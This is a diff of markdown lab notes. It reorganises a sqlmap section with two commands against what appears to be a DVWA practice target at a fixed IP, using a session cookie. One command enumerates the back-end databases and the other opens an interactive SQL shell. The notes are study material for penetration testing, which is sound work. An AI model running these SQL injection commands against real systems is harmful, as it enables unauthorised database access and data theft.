@@ -26,8 +26,13 @@
 ---
 
 ### Using sqlmap 
-```sh
-# Find backend DB
-python ./sqlmap.py -u "http://161.35.202.77/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=d4ool8gsr78mnro6cas6mrlf35; security=low" --dbs
 
+##### Find backend DB
+```sh
+python ./sqlmap.py -u "http://161.35.202.77/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=d4ool8gsr78mnro6cas6mrlf35; security=low" --dbs
+```
+
+##### Getting an interactive sql shell 
+```sh
+python ./sqlmap.py -u "http://161.35.202.77/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=d4ool8gsr78mnro6cas6mrlf35; security=low" --sql-shell
 ```
